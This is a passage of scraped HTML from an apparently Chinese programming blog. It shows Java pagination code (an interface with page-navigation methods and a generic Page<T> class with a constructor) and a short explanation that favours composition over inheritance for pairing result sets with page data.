data-key="1366"> <span data-slate-object="text" data-key="1367"><span data-slate-leaf="true" 
data-offset-key="1367:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1367:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3528955924" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9630980825" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1367:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3528955924" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1367:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3528955924" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_1125782148" data-annotation-type="annotation"><span 
data-slate-string="true">void</span></span></span></span><span data-slate-leaf="true" data-offset-key="1367:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3528955924" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1367:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_4284872004" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3528955924" data-annotation-type="annotation"><span 
data-slate-string="true">setPageNo</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1367:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3528955924" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_3822621763" data-annotation-type="annotation"><span data-slate-string="true">(int 
pageNo)</span></span></span></span><span data-slate-leaf="true" data-offset-key="1367:7"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3528955924" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1367:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1368"> <span data-slate-object="text" data-key="1369"><span data-slate-leaf="true" 
data-offset-key="1369:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1370"> <span data-slate-object="text" data-key="1371"><span data-slate-leaf="true" 
data-offset-key="1371:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1371:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_2681589917" data-annotation-type="annotation"><span data-slate-string="true">// 
数据访问层需要的 start 和 end</span></span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="1372"> <span data-slate-object="text" 
data-key="1373"><span data-slate-leaf="true" data-offset-key="1373:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1373:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_5705325315" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5851044421" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1373:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5851044421" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1373:3"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7990470305" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5851044421" 
data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1373:4"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5851044421" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1373:5"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_6308216626" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5851044421" 
data-annotation-type="annotation"><span data-slate-string="true">getStart</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1373:6"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_9304244706" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5851044421" data-annotation-type="annotation"><span 
data-slate-string="true">()</span></span></span></span><span data-slate-leaf="true" data-offset-key="1373:7"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5851044421" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1373:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1374"> <span data-slate-object="text" data-key="1375"><span data-slate-leaf="true" 
data-offset-key="1375:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1375:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6790237312" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5124367424" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1375:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5124367424" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1375:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5124367424" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_0672024496" data-annotation-type="annotation"><span 
data-slate-string="true">int</span></span></span></span><span data-slate-leaf="true" data-offset-key="1375:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5124367424" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1375:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_5846189484" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5124367424" data-annotation-type="annotation"><span 
data-slate-string="true">getEnd</span></span></span></span><span data-slate-leaf="true" data-offset-key="1375:6"><span 
class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_4029408552" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5124367424" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1375:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5124367424" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1375:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1376"> <span data-slate-object="text" data-key="1377"><span data-slate-leaf="true" 
data-offset-key="1377:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1378"> <span data-slate-object="text" data-key="1379"><span data-slate-leaf="true" 
data-offset-key="1379:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1379:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_3723487941" data-annotation-type="annotation"><span data-slate-string="true">// 
是否还有上一页、下一页</span></span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1380"> <span data-slate-object="text" data-key="1381"><span 
data-slate-leaf="true" data-offset-key="1381:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1381:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_4711686172" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0544727637" 
data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1381:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0544727637" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1381:3"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_2324986679" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0544727637" 
data-annotation-type="annotation"><span data-slate-string="true">boolean</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1381:4"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0544727637" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1381:5"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_4407851476" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0544727637" 
data-annotation-type="annotation"><span data-slate-string="true">hasNextPage</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1381:6"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_8414386946" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_0544727637" data-annotation-type="annotation"><span 
data-slate-string="true">()</span></span></span></span><span data-slate-leaf="true" data-offset-key="1381:7"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0544727637" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1381:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1382"> <span data-slate-object="text" data-key="1383"><span data-slate-leaf="true" 
data-offset-key="1383:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1383:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7903838591" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_0510833229" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1383:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_7903838591" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1383:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7903838591" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_5729460357" data-annotation-type="annotation"><span 
data-slate-string="true">boolean</span></span></span></span><span data-slate-leaf="true" data-offset-key="1383:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_7903838591" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1383:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7903838591" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_7376100620" data-annotation-type="annotation"><span 
data-slate-string="true">hasPrevPage</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1383:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_7903838591" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_5091197692" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1383:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7903838591" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1383:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1384"> <span data-slate-object="text" data-key="1385"><span data-slate-leaf="true" 
data-offset-key="1385:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1386"> <span data-slate-object="text" data-key="1387"><span data-slate-leaf="true" 
data-offset-key="1387:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1387:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_0031931102" data-annotation-type="annotation"><span data-slate-string="true">// 
当前在哪一页</span></span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1388"> <span data-slate-object="text" data-key="1389"><span 
data-slate-leaf="true" data-offset-key="1389:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1389:1"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_4263270490" data-annotation-type="annotation"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_8589066572" 
data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1389:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_4263270490" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1389:3"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_1583357199" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_4263270490" 
data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1389:4"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_4263270490" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1389:5"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_4263270490" data-annotation-type="annotation"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_0464156560" data-annotation-type="annotation"><span 
data-slate-string="true">getPageNo</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1389:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_4263270490" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_7987426744" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1389:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_4263270490" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1389:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1390"> <span data-slate-object="text" data-key="1391"><span data-slate-leaf="true" 
data-offset-key="1391:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 316px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <h3 class="se-834d0d2f" data-slate-type="heading" data-slate-object="block" 
data-key="1392"><span data-slate-object="text" data-key="1393"><span data-slate-leaf="true" 
data-offset-key="1393:0" data-first-offset="true"><span data-slate-string="true">绑定查询结果的分页对象</span></span></span></h3> 
<div class="se-ef6c0583 " data-slate-type="paragraph" data-slate-object="block" data-key="1394"> 
<span data-slate-object="text" data-key="1395"><span data-slate-leaf="true" data-offset-key="1395:0" 
data-first-offset="true"><span class="se-ca64a468" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">第二种则将分页对象和查询数据的结果集绑定在一起，有的是将结果集对象继承自一个分页类，有的则是将结果集对象以组合的方式放到分页对象里面，数据访问层直接返回这个携带实际数据的分页对象。</span></span></span></span><span 
data-slate-object="text" data-key="1396"><span data-slate-leaf="true" data-offset-key="1396:0" 
data-first-offset="true"><span data-slate-string="true">从优先使用组合而不是继承的角度来说，组合的方式通常更好一些。</span></span></span> 
</div> <div class="se-856117e8 " data-slate-type="paragraph" data-slate-object="block" data-key="1397"> 
<span data-slate-object="text" data-key="1398"><span data-slate-leaf="true" data-offset-key="1398:0" 
data-first-offset="true"><span data-slate-string="true">具体说，我们可以定义这样的分页对象：</span></span></span> 
</div> <div class="se-844d02df se-cde2c9d6" data-slate-type="pre" data-slate-object="block" 
data-key="1399" data-code-language="cpp"> <div class="se-47a28eed se-fb0226ba"> <span></span> 
</div> <div class="se-133e5553"> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="1"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="2"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="3"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="4"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="5"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="6"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="7"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="8"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="9"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="10"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="11"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="12"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="13"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="14"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="15"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="16"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="17"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="18"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="19"></div> 
</div> <div class="se-269e3ed3 ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1400"> <span data-slate-object="text" data-key="1401"><span 
data-slate-leaf="true" data-offset-key="1401:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8754773622" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span><span data-slate-leaf="true" data-offset-key="1401:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1401:2"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_2568315340" data-annotation-type="annotation"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_4740427630" 
data-annotation-type="annotation"><span data-slate-string="true">class</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1401:3"><span class=" gkhl-class" data-slate-object="annotation" 
data-annotation-key="gkann_2568315340" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1401:4"><span class=" gkhl-class" 
data-slate-object="annotation" data-annotation-key="gkann_2568315340" data-annotation-type="annotation"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_2267575282" data-annotation-type="annotation"><span 
data-slate-string="true">Page</span></span></span></span><span data-slate-leaf="true" data-offset-key="1401:5"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_2568315340" data-annotation-type="annotation"><span 
data-slate-string="true">&lt;T&gt; {</span></span></span></span> </div> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="1402"> <span data-slate-object="text" 
data-key="1403"><span data-slate-leaf="true" data-offset-key="1403:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1403:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_5479666366" 
data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1403:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1403:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1368102186" data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span><span 
data-slate-leaf="true" data-offset-key="1403:4"><span data-slate-string="true"> pageNo;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1404"> <span data-slate-object="text" data-key="1405"><span data-slate-leaf="true" 
data-offset-key="1405:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1405:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2018064994" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1405:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1405:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1575898345" data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span><span 
data-slate-leaf="true" data-offset-key="1405:4"><span data-slate-string="true"> totalCount;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1406"> <span data-slate-object="text" data-key="1407"><span data-slate-leaf="true" 
data-offset-key="1407:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1407:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9338451626" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1407:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1407:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8921816192" data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span><span 
data-slate-leaf="true" data-offset-key="1407:4"><span data-slate-string="true"> pageSize;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1408"> <span data-slate-object="text" data-key="1409"><span data-slate-leaf="true" 
data-offset-key="1409:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1409:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4072271057" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1409:2"><span data-slate-string="true"> Collection&lt;T&gt; 
data; </span></span><span data-slate-leaf="true" data-offset-key="1409:3"><span class=" gkhl-comment" 
data-slate-object="annotation" data-annotation-key="gkann_2836090043" data-annotation-type="annotation"><span 
data-slate-string="true">// 当前页的实际业务对象</span></span></span></span> </div> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="1410"> <span data-slate-object="text" 
data-key="1411"><span data-slate-leaf="true" data-offset-key="1411:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="1412"> <span data-slate-object="text" 
data-key="1413"><span data-slate-leaf="true" data-offset-key="1413:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1413:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_1815068801" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5137500007" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1413:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5137500007" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1413:3"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_1314545517" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5137500007" 
data-annotation-type="annotation"><span data-slate-string="true">Page</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1413:4"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_6305615691" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5137500007" data-annotation-type="annotation"><span 
data-slate-string="true">(Collection&lt;T&gt; data, int pageSize, int pageNo, int totalCount)</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1413:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5137500007" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1413:6"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1414"> <span data-slate-object="text" data-key="1415"><span data-slate-leaf="true" 
data-offset-key="1415:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1415:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3346588532" data-annotation-type="annotation"><span data-slate-string="true">this</span></span></span><span 
data-slate-leaf="true" data-offset-key="1415:2"><span data-slate-string="true">.data = data;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1416"> <span data-slate-object="text" data-key="1417"><span data-slate-leaf="true" 
data-offset-key="1417:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1417:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6703147792" data-annotation-type="annotation"><span data-slate-string="true">this</span></span></span><span 
data-slate-leaf="true" data-offset-key="1417:2"><span data-slate-string="true">.pageSize = 
pageSize;</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1418"> <span data-slate-object="text" data-key="1419"><span 
data-slate-leaf="true" data-offset-key="1419:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1419:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9959262368" data-annotation-type="annotation"><span 
data-slate-string="true">this</span></span></span><span data-slate-leaf="true" data-offset-key="1419:2"><span 
data-slate-string="true">.pageNo = pageNo;</span></span></span> </div> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="1420"> <span data-slate-object="text" 
data-key="1421"><span data-slate-leaf="true" data-offset-key="1421:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1421:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_2461053252" 
data-annotation-type="annotation"><span data-slate-string="true">this</span></span></span><span 
data-slate-leaf="true" data-offset-key="1421:2"><span data-slate-string="true">.totalCount 
= totalCount;</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1422"> <span data-slate-object="text" data-key="1423"><span 
data-slate-leaf="true" data-offset-key="1423:0" data-first-offset="true"><span data-slate-string="true"> 
}</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1424"> <span data-slate-object="text" data-key="1425"><span 
data-slate-leaf="true" data-offset-key="1425:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1426"> <span data-slate-object="text" data-key="1427"><span 
data-slate-leaf="true" data-offset-key="1427:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1427:1"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_7293233827" 
data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1427:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1427:3"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9575953830" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0612463576" 
data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1427:4"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1427:5"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_6157266757" data-annotation-type="annotation"><span 
data-slate-string="true">getPageSize</span></span></span></span><span data-slate-leaf="true" 
